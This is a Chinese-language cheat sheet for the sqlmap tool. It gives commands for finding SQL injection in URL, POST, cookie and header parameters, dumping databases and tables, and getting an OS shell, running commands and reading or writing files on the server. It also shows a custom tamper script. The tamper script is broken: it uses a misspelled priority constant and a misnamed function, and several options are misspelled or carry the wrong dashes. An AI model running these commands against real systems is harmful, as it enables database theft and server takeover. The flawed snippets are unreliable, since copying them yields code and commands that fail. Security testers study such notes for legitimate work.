## 31. sqlmap
#sqlmap
-   检测等级 --level(1-5) 逐级增强

### 31.1 GET注入

``` shell
python ./sqlmap.py -u "url" #检测
python ./sqlmap.py -u "url" --dbs #列出数据库
python ./sqlmap.py -u "url" --table #表
python ./sqlmap.py -u "url" --columns -T "tbname"
python ./sqlmap.py -u "url" --dump -T "tbname" -C "cname" #爆字段 
```

### 31.2 POST注入

``` shell
--data "id=1"
```

### 31.3 COOKIE注入

``` shell
--cookie "" --level 3
```

### 31.4 属性头注入

``` shell
--refere "" --level 3
--headers "" --level 3
```

### 31.5 星号指定优先级

``` shell
python ./sqlmap.py -u "?id=1&passwd=2*" #优先检测passwd参数
```

### 31.6 命令执行

```shell
python ./sqlmap.py -u "url" --os-shell #系统交互shell
python ./sqlmap.py -u "url" --os-cmd=ipconfig #
```

### 31.7 自定义数据

```shell
-r "./request.txt"
```

### 31.8 注入的类型

-   B：Boolean-based blind SQL injection（布尔盲注）
-   E：Error-based SQL injection（报错注入）
-   U:UNION query SQL injection（联合请求注入）
-   S：Stacked queries SQL injection（堆叠注入）
-   T：Time-based blind SQL injection（延时盲注）

```shell
--technique #指定注入类型
```

### 31.9 其他

```shell
-proxy "http:..127.0.0.1:8118" #代理
-thread 3 #指定多线程
-sql-query "sql" #执行指定的sql语句
-file-read #读指定文件
-file-write "./temp.txt" #写入本地文件
-dbms #指定数据库
--start 1 --stop 3 #获取一段数据
--prefix "a" --suffix "b" #前缀或后缀
--dump
```

### 31.10 添加自定义脚本

```python
# sqlmap/tamper/temp.py
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOWSET
def dependencies():
    pass
def temper(payload,**kwargs):
    return payload.replace("","\\").replace("","\\")
```

```shell
--tamper=temp
```

### 31.11 DNS查询

```shell
--dns-domain
```


